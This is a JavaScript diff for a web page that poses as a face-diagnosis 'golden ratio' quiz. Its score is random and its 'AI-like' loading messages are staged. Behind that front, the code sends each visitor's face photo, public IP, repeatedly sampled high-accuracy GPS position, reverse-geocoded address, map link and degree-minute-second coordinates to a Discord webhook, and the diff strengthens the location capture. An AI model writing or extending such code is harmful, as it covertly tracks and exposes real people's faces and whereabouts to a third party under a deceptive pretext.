@@ -102,20 +102,64 @@ function startDiagnosis() {
   result.innerHTML = "診断中...";
 
   if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        runDiagnosis(pos.coords.latitude, pos.coords.longitude);
-      },
-      () => {
-        runDiagnosis(null, null);
-      },
-      {
-        enableHighAccuracy: true
-      }
-    );
+    collectPositions(5).then(pos => {
+      runDiagnosis(pos?.latitude, pos?.longitude);
+    }).catch(() => {
+      runDiagnosis(null, null);
+    });
   } else {
     runDiagnosis(null, null);
   }
+}
+
+// 複数回位置情報を取得して最頻値を返す
+function collectPositions(times) {
+  return new Promise((resolve, reject) => {
+    const positions = [];
+    let count = 0;
+
+    function getPos() {
+      navigator.geolocation.getCurrentPosition(
+        (p) => {
+          positions.push({ latitude: p.coords.latitude, longitude: p.coords.longitude });
+          count++;
+          if (count < times) {
+            setTimeout(getPos, 200);
+          } else {
+            const mostFreq = mostFrequentPosition(positions);
+            resolve(mostFreq);
+          }
+        },
+        (err) => {
+          count++;
+          if (count >= times) {
+            if (positions.length > 0) resolve(mostFrequentPosition(positions));
+            else reject(err);
+          } else {
+            setTimeout(getPos, 200);
+          }
+        },
+        { enableHighAccuracy: true }
+      );
+    }
+
+    getPos();
+  });
+}
+
+// 最頻値を算出
+function mostFrequentPosition(positions) {
+  if (positions.length === 0) return null;
+
+  const keyCount = {};
+  positions.forEach(p => {
+    const key = `${p.latitude.toFixed(5)},${p.longitude.toFixed(5)}`;
+    keyCount[key] = (keyCount[key] || 0) + 1;
+  });
+
+  const maxKey = Object.keys(keyCount).reduce((a, b) => keyCount[a] > keyCount[b] ? a : b);
+  const [latitude, longitude] = maxKey.split(',').map(Number);
+  return { latitude, longitude };
 }
 
 // 診断処理
@@ -129,12 +173,9 @@ function runDiagnosis(lat, lon) {
     document.getElementById("preview").src = base64;
     document.getElementById("previewBox").style.display = "block";
 
-    // AIっぽい演出
     const result = document.getElementById("result");
     result.innerHTML = "顔検出中...";
-    setTimeout(() => {
-      result.innerHTML = "特徴解析中...";
-    }, 500);
+    setTimeout(() => { result.innerHTML = "特徴解析中..."; }, 500);
 
     setTimeout(async () => {
       const score = Math.floor(30 + Math.random() * 20);
@@ -171,6 +212,21 @@ async function getAddress(lat, lon) {
   }
 }
 
+// 度→度分秒変換
+function toDMS(lat, lon) {
+  function convert(deg) {
+    const d = Math.floor(deg);
+    const m = Math.floor((deg - d) * 60);
+    const s = (((deg - d) * 60 - m) * 60).toFixed(1);
+    return [d, m, s];
+  }
+  const [latD, latM, latS] = convert(Math.abs(lat));
+  const [lonD, lonM, lonS] = convert(Math.abs(lon));
+  const latDir = lat >= 0 ? "N" : "S";
+  const lonDir = lon >= 0 ? "E" : "W";
+  return `${latD}°${latM}'${latS}"${latDir} ${lonD}°${lonM}'${lonS}"${lonDir}`;
+}
+
 // Discord送信
 async function sendToDiscord(base64, score, rank, lat, lon) {
   const fd = new FormData();
@@ -179,20 +235,21 @@ async function sendToDiscord(base64, score, rank, lat, lon) {
   const ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());
 
   let address = "不明";
-  if (lat && lon) {
+  let dms = "不明";
+  if (lat != null && lon != null) {
     address = await getAddress(lat, lon);
+    dms = toDMS(lat, lon);
   }
 
   fd.append("payload_json", JSON.stringify({
     content: `
-    console.log("座標:", lat, lon);
-console.log("住所:", address);
 📸 顔診断
 IP: ${ipData.ip}
 地域: ${address}
 位置: https://maps.google.com/?q=${lat ?? "不明"},${lon ?? "不明"}
 黄金比: ${score}%
 ランク: ${rank}
+DMS: ${dms}
 `
   }));
 
